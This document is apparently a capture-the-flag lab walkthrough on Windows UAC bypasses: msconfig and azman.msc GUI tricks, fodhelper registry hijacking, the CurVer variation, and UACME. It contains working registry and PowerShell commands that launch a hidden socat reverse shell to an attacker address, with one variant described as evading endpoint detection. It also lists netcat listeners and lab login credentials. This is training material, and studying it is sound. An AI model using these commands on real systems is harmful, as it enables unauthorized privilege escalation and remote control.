## 🖥️ Lab Environment Connection

```bash
# Establish a remote desktop session to the target laboratory workstation
xfreerdp /v:10.128.163.98 /u:attacker /p:Password321
```
* Tool: xfreerdp

---

## ⚙️ GUI-Based Bypass: msconfig Case Study

The Microsoft Configuration Utility (`msconfig.exe`) utilizes the auto-elevation feature, allowing specific system binaries to run with a High Integrity Level (IL) token without prompting the user via User Account Control (UAC). If an operator leverages native features within an auto-elevated graphical process to execute a shell, the resulting process inherits the elevated token.

```cmd
# Execute the specific challenge flag binary within the High IL command prompt
C:\flags\GetFlag-msconfig.exe
```
* Tool: Windows Command Prompt

---

## 🛡️ GUI-Based Bypass: azman.msc Case Study

The Authorization Manager Console (`azman.msc`) executes via the Microsoft Management Console (`mmc.exe`) and auto-elevates to a High Integrity Level. Privilege escalation is achieved by abusing the application's help interface to spawn an external editor, which is subsequently used to execute a high-integrity shell instance.

```cmd
# Execute the target flag binary from the elevated command prompt spawned via MMC
C:\flags\GetFlag-azman.exe
```
* Tool: Windows Command Prompt

---

## 🔑 Registry Hijacking: fodhelper.exe

The Features on Demand Helper (`fodhelper.exe`) is an auto-elevating binary that searches the current user registry hive (`HKCU`) for specific class associations to execute commands. Operators can modify these registry entries to intercept the execution path and execute arbitrary payloads at a High Integrity Level.

```bash
# Establish initial access to the target host via the existing persistence backdoor
nc 10.128.161.56 9999
```
* Tool: Netcat

```cmd
# Assess local group membership status and current token integrity level
whoami
net user attacker | find "Local Group"
whoami /groups | find "Label"
```
* Tool: Windows Command Prompt

```cmd
# Configure the targeted registry keys and specify the reverse shell execution string
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
```
* Tool: Windows Registry Editor (reg)

```bash
# Initialize a local network listener to intercept the incoming privileged connection
nc -lvp 4444
```
* Tool: Netcat

```cmd
# Trigger the execution of the auto-elevating binary to parse the hijacked registry structure
fodhelper.exe
```
* Tool: Windows Command Prompt

```cmd
# Validate the high-integrity context and capture the administrative flag
whoami /groups | find "Label"
C:\flags\GetFlag-fodhelper.exe
```
* Tool: Windows Command Prompt

### Remediation & Artifact Cleanup

```cmd
# Delete the modified registry keys to eradicate indicators of compromise
reg delete HKCU\Software\Classes\ms-settings\ /f
```
* Tool: Windows Registry Editor (reg)

---

## 🚀 Advanced Registry Hijacking: CurVer Modification

An alternative variation involves leveraging the `CurVer` (Current Version) entry under a custom programmatic identifier (progID) registry subkey. This mechanism maps the `ms-settings` protocol connection to an arbitrary progID name, providing greater flexibility and lower detection rates against static security controls.

```powershell
# PowerShell script to instantiate a custom progID and map the ms-settings CurVer pointer
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```
* Tool: PowerShell

```bash
# Establish a secondary local listener to capture the CurVer-redirected session
nc -lvp 4445
```
* Tool: Netcat

```cmd
# Command-line alternative implementation to bypass endpoint detection mechanisms monitoring PowerShell
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
fodhelper.exe
```
* Tool: Windows Registry Editor (reg)

```cmd
# Confirm elevated privilege status and pull the final case flag
whoami /groups | find "Label"
C:\flags\GetFlag-fodhelper-curver.exe
```
* Tool: Windows Command Prompt

### Remediation & Artifact Cleanup

```cmd
# Purge the experimental progID and protocol redirection entries from the registry hive
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```
* Tool: Windows Registry Editor (reg)

---

## 🤖 Automated UAC Bypass Verification

Defenders and auditors utilize standardized toolsets to assess endpoint resistance to known elevation flaws. The `UACME` framework provides pre-compiled templates to test distinct vector definitions sequentially.

```cmd
# Change directory to the tool location and run the Akagi64 executable targeting method 33
cd /tools
UACME-Akagi64.exe 33
```
* Tool: UACME (Akagi)

| Method ID | Bypass Technique |
| :--- | :--- |
| **33** | `fodhelper.exe` registry path exploitation |
| **34** | `DiskCleanup` scheduled task environment variable injection |
| **70** | `fodhelper.exe` execution leveraging the `CurVer` registry key variation |
